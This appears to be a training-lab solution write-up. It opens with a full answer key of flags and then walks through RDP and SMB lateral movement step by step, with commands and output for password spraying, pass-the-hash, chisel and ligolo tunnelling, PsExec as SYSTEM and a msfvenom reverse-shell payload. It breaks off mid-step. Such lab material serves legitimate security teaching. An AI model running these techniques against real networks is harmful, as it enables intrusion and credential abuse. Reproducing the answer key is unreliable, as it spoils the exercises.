| Section                                         | Question Number | Answer                                                |
| ----------------------------------------------- | --------------- | ----------------------------------------------------- |
| Remote Desktop Service (RDP)                    | Question 1      | Crismerlin                                            |
| Remote Desktop Service (RDP)                    | Question 2      | RDP\_For4\_Lateral\_Movement                          |
| Remote Desktop Service (RDP)                    | Question 3      | Leonvqz                                               |
| Remote Desktop Service (RDP)                    | Question 4      | YouCan\_Perform\_Password\_Spray\_with\_RDP           |
| Server Message Block (SMB)                      | Question 1      | SMB\_as\_user\_for\_Lateral\_Movement                 |
| Server Message Block (SMB)                      | Question 2      | Using\_Services\_For\_LateralMovement                 |
| Server Message Block (SMB)                      | Question 3      | Lateral\_Movement\_1s\_Fun                            |
| Windows Management Instrumentation (WMI)        | Question 1      | 00429-00521-62775-AA590                               |
| Windows Management Instrumentation (WMI)        | Question 2      | 20240513060539.000000-360                             |
| Windows Management Instrumentation (WMI)        | Question 3      | Helen\_WMI\_Flag                                      |
| Windows Remote Management (WinRM)               | Question 1      | Testing\_WINRM\_Connection                            |
| Windows Remote Management (WinRM)               | Question 2      | Using\_Hash\_For\_WinRM\_LateralMov                   |
| Windows Remote Management (WinRM)               | Question 3      | Restricted\_Access\_From\_SRV02\_Only                 |
| Distributed Component Object Model (DCOM)       | Question 1      | New\_ways\_of\_getting\_access                        |
| Distributed Component Object Model (DCOM)       | Question 2      | Linux\_DCOM\_Access                                   |
| Secure Shell (SSH)                              | Question 1      | Simple\_SSH\_Authentication                           |
| Secure Shell (SSH)                              | Question 2      | unknown\_id\_rsa                                      |
| Secure Shell (SSH)                              | Question 3      | 2299                                                  |
| Secure Shell (SSH)                              | Question 4      | josias                                                |
| Secure Shell (SSH)                              | Question 5      | SSH\_KEY\_Authentication                              |
| Remote Management Tools                         | Question 1      | VNCPass1                                              |
| Remote Management Tools                         | Question 2      | Filiplain                                             |
| Remote Management Tools                         | Question 3      | VNC\_Connection\_Is\_FUN                              |
| Software Deployment and Remote Management Tools | Question 1      | CoreServers                                           |
| Software Deployment and Remote Management Tools | Question 2      | Domain\_Controller\_Compromised\_by\_3rdPartySoftware |
| Windows Server Update Services (WSUS)           | Question 1      | WSUS\_Rights\_Are\_Powerful                           |
| Skill Assessment                                | Question 1      | Getting\_Started\_PSWA                                |
| Skill Assessment                                | Question 2      | IPv6Access\_Non\_DefaultPort                          |
| Skill Assessment                                | Question 3      | Rossy                                                 |
| Skill Assessment                                | Question 4      | Themother92                                           |
| Skill Assessment                                | Question 5      | PASS001                                               |
| Skill Assessment                                | Question 6      | M@Ster1ng\_the\_ART\_OF\_Lateral\_Movement            |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Remote Desktop Service (RDP)

## Question 1

### "Confirm which user other than Helen is member of "Remote Desktop Users" group on SRV01."

After spawning the target, students will have to connect via RDP using the credentials `helen:RedRiot88`:

Code: shell

```shell
xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ xfreerdp /v:10.129.229.244 /u:helen /p:RedRiot88 /dynamic-resolution

[03:42:07:148] [6262:6296] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:42:07:148] [6262:6296] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:42:07:148] [6262:6296] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:42:07:274] [6262:6296] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:42:07:274] [6262:6296] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.244:3389) 
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - 	SRV01.inlanefreight.local
[03:42:07:276] [6262:6296] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.244:3389 (RDP-Server):
	Common Name: SRV01.inlanefreight.local
	Subject:     CN = SRV01.inlanefreight.local
	Issuer:      CN = SRV01.inlanefreight.local
	Thumbprint:  04:d5:23:5c:1a:e6:9d:81:eb:81:f1:ee:17:4f:e3:c0:be:1c:55:e4:dd:d1:f8:f3:2f:f6:8d:14:ed:c7:da:88
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

With the established RDP session, students will proceed to open `PowerShell` and query the `Remote Desktop Users` group, finding another user in the group:

Code: powershell

```powershell
net localgroup "Remote Desktop Users"
```

```
PS C:\Users\helen> net localgroup "Remote Desktop Users"

Alias name     Remote Desktop Users
Comment        Members in this group are granted the right to logon remotely

Members

-------------------------------------------------------------------------------
INLANEFREIGHT\{hidden}
INLANEFREIGHT\helen
The command completed successfully.
```

Answer: `Crismerlin`

# Remote Desktop Service (RDP)

## Question 2

### "Perform a Password Spray using Helen's credentials. Connect with the account you found and read the flag located at C:\\Flags\\RDPflag.txt"

Using the previous spawned target and RDP session, students will proceed to enumerate the users in the domain using `Get-ADUser` and will note down the users' return from the output:

Code: powershell

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
```

```
PS C:\Users\helen> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName

Administrator
Guest
krbtgt
Redpostmanrd
Snowfreeze
Lich
Crismerlin
Helen
Tiltmanx
Maria
Jhomil
Thael
Leonvqz
Frewdy
Josias
Thesuperteacher
Ambioris
Filiplain
Xracer
```

Students will return to their workstations and create a wordlist based on the users found in the previous command. The users will be used further in a password spraying attack using `NetExec` and targeting the RDP protocol:

Code: shell

```shell
netexec rdp STMIP -u users.txt -p RedRiot88
```

```
┌─[✗]─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ netexec rdp 10.129.229.244 -u users.txt -p RedRiot88

RDP         10.129.229.244  3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 17763 (name:SRV01) (domain:inlanefreight.local) (nla:True)
RDP         10.129.229.244  3389   SRV01            [-] inlanefreight.local\Administrator:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [-] inlanefreight.local\Guest:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [-] inlanefreight.local\krbtgt:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [-] inlanefreight.local\Redpostmanrd:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [-] inlanefreight.local\Snowfreeze:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [-] inlanefreight.local\Lich:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [+] inlanefreight.local\Crismerlin:RedRiot88 (Pwn3d!)
```

Subsequently, students will proceed to establish an RDP session using the newly found credentials of `Crismerlin:RedRiot88`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Crismerlin /p:RedRiot88 /dynamic-resolution
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ xfreerdp /v:10.129.229.244 /u:Crismerlin /p:RedRiot88 /dynamic-resolution

[05:00:14:545] [147737:147738] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:00:14:545] [147737:147738] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[05:00:16:854] [147737:147738] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:00:16:055] [147737:147738] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:00:16:056] [147737:147738] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:00:16:165] [147737:147738] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:00:16:166] [147737:147738] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:00:16:166] [147737:147738] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[05:00:17:058] [147737:147738] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
```

Subsequently, students need to open `PowerShell` and query the contents of the `RDPFlag.txt` located in `C:\Flags`:

Code: powershell

```powershell
type C:\Flags\RDPFlag.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\crismerlin> type C:\Flags\RDPFlag.txt
```

Answer: `RDP_For4_Lateral_Movement`

# Remote Desktop Service (RDP)

## Question 3

### "Find which user can connect via RDP using this hash \`A35289033D176ABAAF6BEAA0AA681400\`:"

Students will reuse the previously spawned target and the user list they created. Subsequently, they will utilize `NetExec` on their workstations and the RDP protocol to proceed with spraying the hash and finding the user who can RDP using the hash:

Code: shell

```shell
netexec rdp STMIP -u users.txt -H A35289033D176ABAAF6BEAA0AA681400 | grep '[+]'
```

```
┌─[✗]─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ netexec rdp 10.129.229.244 -u users.txt -H A35289033D176ABAAF6BEAA0AA681400 | grep '[+]'

RDP                      10.129.229.244  3389   SRV01            [+] inlanefreight.local\{hidden}:A35289033D176ABAAF6BEAA0AA681400 
```

Answer: `Leonvqz`

# Remote Desktop Service (RDP)

## Question 4

### "Connect to SRV02 with the user from the previous question and read the flag located at C:\\Flags\\hash.txt"

Students will reuse the previously spawned target and RDP session(s). Subsequently, they will open `PowerShell` and ping `SRV02` to uncover the IP address assigned to that machine:

Code: powershell

```powershell
ping SRV02
```

```
PS C:\Users\helen> ping SRV02

Pinging SRV02.inlanefreight.local [172.20.0.52] with 32 bytes of data:
Reply from 172.20.0.52: bytes=32 time=1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128

Ping statistics for 172.20.0.52:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

Subsequently, students will come to know that `SRV02` is part of an internal network, meaning that they will have to establish dynamic port-forwarding using a [chisel](https://github.com/jpillora/chisel). On their workstations, students will proceed to download the respective versions for Linux and Windows from the [releases](https://github.com/jpillora/chisel/releases/tag/v1.9.1):

Code: shell

```shell
wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz; wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

```
┌─[✗]─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz; wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

Once downloaded, students will proceed to unzip them using `gunzip`:

Code: shell

```shell
gunzip chisel_1.9.1_*
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ gunzip chisel_1.9.1_*
```

Subsequently, students will proceed to rename the `chisel_1.9.1_windows_amd64` to `chisel.exe`, then change the permissions over `chisel_1.9.1_linux_amd64` to be executable:

Code: shell

```shell
mv chisel_1.9.1_windows_amd64 chisel.exe
chmod +x chisel_1.9.1_linux_amd64
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ mv chisel_1.9.1_windows_amd64 chisel.exe

┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ chmod +x chisel_1.9.1_linux_amd64
```

Students will start a Python HTTP server to transfer the `chisel.exe` onto the target machine:

Code: shell

```shell
python3 -m http.server
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students will return to the RDP session and the previously spawned `PowerShell` window, where they will proceed to download the executable:

Code: powershell

```powershell
iwr -uri http://PWNIP:8000/chisel.exe -o chisel.exe
```

```
PS C:\Users\helen> iwr -uri http://10.10.15.174:8000/chisel.exe -o chisel.exe
```

Students will return to their workstations, they can terminate the Python HTTP server, and they will proceed to start `chisel` in `server` mode:

Code: shell

```shell
./chisel_1.9.1_linux_amd64 server --reverse 
```

```
┌─[✗]─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ ./chisel_1.9.1_linux_amd64 server --reverse

2024/07/10 05:31:27 server: Reverse tunnelling enabled
2024/07/10 05:31:27 server: Fingerprint KR7B7NniaZ35DIiLDhAO153+Iur8NfJ5BP1KNtyIarI=
2024/07/10 05:31:27 server: Listening on http://0.0.0.0:8080
```

Subsequently, students will return to the RDP session to establish the dynamic port-forwarding using `chisel` in `client` mode:

Code: powershell

```powershell
.\chisel.exe client PWNIP:8080 R:socks
```

```
PS C:\Users\helen> .\chisel.exe client 10.10.15.174:8080 R:socks

2024/07/10 05:33:14 client: Connecting to ws://10.10.15.174:8080
2024/07/10 05:33:15 client: Connected (Latency 8.9474ms)
```

Students will return to their workstations, open a new tab, and modify their `proxychains.conf` configurational file:

Code: shell

```shell
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf'
sudo sh -c 'sed -i s/9050/1080/g /etc/proxychains.conf'
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-tj22pb36f6]─[~]
└──╼ [★]$ sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf'

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-tj22pb36f6]─[~]
└──╼ [★]$ sudo sh -c 'sed -i s/9050/1080/g /etc/proxychains.conf'
```

Subsequently, students will proceed to connect to SRV02 (`172.20.0.52`) using proxychains via RDP:

Code: shell

```shell
proxychains xfreerdp /v:172.20.0.52 /u:Leonvqz /pth:A35289033D176ABAAF6BEAA0AA681400 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-tj22pb36f6]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.20.0.52 /u:Leonvqz /pth:A35289033D176ABAAF6BEAA0AA681400 /dynamic-resolution

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.20.0.52:3389  ...  OK
[00:15:46:190] [21173:21175] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:15:46:190] [21173:21175] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.20.0.52:3389) 
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - 	SRV02.inlanefreight.local
[00:15:46:190] [21173:21175] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.20.0.52:3389 (RDP-Server):
	Common Name: SRV02.inlanefreight.local
	Subject:     CN = SRV02.inlanefreight.local
	Issuer:      CN = SRV02.inlanefreight.local
	Thumbprint:  58:20:f6:6b:22:d2:a1:92:9e:47:2e:10:1b:03:10:67:90:af:9d:49:8b:81:40:c6:fa:f4:4e:56:47:c4:f2:e5
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students will open `PowerShell` and grab the flag located in the `C:\Flags` directory:

Code: powershell

```powershell
type C:\Flags\hash.txt
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Leonvqz> type C:\Flags\hash.txt
```

Answer: `YouCan_Perform_Password_Spray_with_RDP`

# Server Message Block (SMB)

## Question 1

### "Use PsExec to get a shell as Helen on SRV02 and read the flag located at C:\\Flags\\helensonly.txt"

After spawning the target, students will have to connect via RDP using the credentials `helen:RedRiot88`:

Code: shell

```shell
xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-tj22pb36f6]─[~]
└──╼ [★]$ xfreerdp /v:10.129.199.2 /u:helen /p:RedRiot88 /dynamic-resolution 

[00:34:56:219] [123434:123435] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:34:56:219] [123434:123435] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.199.2:3389) 
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - 	SRV01.inlanefreight.local
[00:34:56:220] [123434:123435] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.199.2:3389 (RDP-Server):
	Common Name: SRV01.inlanefreight.local
	Subject:     CN = SRV01.inlanefreight.local
	Issuer:      CN = SRV01.inlanefreight.local
	Thumbprint:  04:d5:23:5c:1a:e6:9d:81:eb:81:f1:ee:17:4f:e3:c0:be:1c:55:e4:dd:d1:f8:f3:2f:f6:8d:14:ed:c7:da:88
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will proceed to open `PowerShell`, navigate to `C:\Tools\SysInternalsSuite`, and use `PsExec` to establish a session on SRV02:

Code: powershell

```powershell
cd C:\Tools\SysInternalsSuite
.\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\helen> cd C:\Tools\SysInternalsSuite
PS C:\Tools\SysInternalsSuite> .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd
```

Subsequently, students can proceed to grab the flag located in the `C:\Flags` directory:

Code: powershell

```powershell
type C:\Flags\helensonly.txt
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Flags\helensonly.txt
```

Answer: `SMB_as_user_for_Lateral_Movement`

# Server Message Block (SMB)

## Question 2

### "Use any tool to get a shell on SRV02 using the service Application Layer Gateway Service (ALG) and read the flag located at C:\\Flags\\serviceflag.txt:"

Students will reuse the previously spawned target and RDP session(s). They will exit from the previous `PsExec` session and will establish a new one with `SYSTEM` privileges by adding the `-s` parameter:

Code: powershell

```powershell
.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd
```

```
PS C:\Tools\SysInternalsSuite> .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Within the session of `PsExec` on SRV02, they will proceed to modify the registry key, allowing guest access in SMB2 and SMB3:

Code: powershell

```powershell
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
```

```
C:\Windows\system32>reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
The operation completed successfully.
```

Subsequently, they will open `PowerShell` and ping `SRV02` to uncover the IP address assigned to that machine:

Code: powershell

```powershell
ping SRV02
```

```
PS C:\Users\helen> ping SRV02

Pinging SRV02.inlanefreight.local [172.20.0.52] with 32 bytes of data:
Reply from 172.20.0.52: bytes=32 time=1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128
Reply from 172.20.0.52: bytes=32 time<1ms TTL=128

Ping statistics for 172.20.0.52:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

Subsequently, students will come to know that `SRV02` is part of an internal network, meaning that they will have to establish dynamic port-forwarding using a [ligolo-ng](https://github.com/nicocha30/ligolo-ng). On their workstations, students will proceed to download the respective versions for Linux and Windows from the [releases](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.2):

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
```

Once downloaded, students will proceed to extract the archives using `unzip` and `tar`:

Code: shell

```shell
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ unzip ligolo-ng_agent_0.6.2_windows_amd64.zip

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe 

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz 

LICENSE
README.md
proxy

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ chmod +x proxy
```

Students will start a Python HTTP server to transfer the `chisel.exe` onto the target machine:

Code: shell

```shell
python3 -m http.server
```

```
┌─[htb-ac-8414@htb-qm41uzp2hn]─[~]
└──╼ $ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, students will return to the RDP session and the previously spawned `PowerShell` window, where they will proceed to download the executable:

Code: powershell

```powershell
iwr -uri http://PWNIP:8000/agent.exe -o agent.exe
```

```
PS C:\Users\helen> iwr -uri http://10.10.15.174:8000/agent.exe -o agent.exe
```

Students will return to their workstations, they can terminate the Python HTTP server, and they will proceed to start `ligolo`'s proxy:

Code: shell

```shell
./proxy -selfcert
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: A910475F1FBB2F071C47BC3CCF0685188A816C82CB654A25505479E67071293B 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng » 
```

Subsequently, students will return to the RDP session to establish the dynamic port-forwarding using the agent previously transferred:

Code: powershell

```powershell
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
PS C:\Users\helen> .\agent.exe -connect 10.10.14.221:11601 -ignore-cert

time="2024-07-11T03:49:21-05:00" level=warning msg="warning, certificate validation disabled"
time="2024-07-11T03:49:21-05:00" level=info msg="Connection established" addr="10.10.14.221:11601"
```

Subsequently, students need to return to their workstations, open a new tab, and proceed to add a new network interface based on their usernames in the workstation (e.g. `htb-ac-XXXX`) and the subnet of the internal network. Additionally, students will query the `my_credentials.txt` file located on the Desktop to get t

Code: shell

```shell
cat Desktop/my_credentials.txt | grep Username
sudo ip tuntap add user <htb-ac-XXXX> mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.20.0.0/24 dev ligolo
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ cat Desktop/my_credentials.txt | grep Username
Username: htb-ac-8414

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip tuntap add user htb-ac-8414 mode tun ligolo

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip link set ligolo up

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip route add 172.20.0.0/24 dev ligolo
```

Students will return to `ligolo`'s proxy console, use the `session` command, select the agent, and initiate the tunnel (they need to press `Enter` after session):

Code: shell

```shell
session
start
```

```
INFO[6389] Agent joined.                                 name="INLANEFREIGHT\\helen@SRV01" remote="10.129.229.244:49730"
ligolo-ng » session 
? Specify a session : 2 - #2 - INLANEFREIGHT\helen@SRV01 - 10.129.229.244:49730

[Agent : INLANEFREIGHT\helen@SRV01] » start
INFO[6744] Starting tunnel to INLANEFREIGHT\helen@SRV0
```

Students will proceed to generate a Windows reverse shell using `msfvenom` and the `windows/x64_shell_reverse_tcp` payload:

Code: shell

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f exe-service -o service-shell.exe
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-yvuptgywyj]─[~]
└──╼ [★]$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.221 LPORT=9001 -f exe-service -o service-shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: service-shell.exe
```

Subsequently, students will initiate an SMB server using Impacket:

Code: shell

```shell
sudo impacket-smbserver share ./ -smb2support
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-yvuptgywyj]─[~]
└──╼ [★]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Students will proceed to open a new terminal tab and change the path to the ALG service to their workstations' IP using `impacket-services` script:

Code: shell

```shell
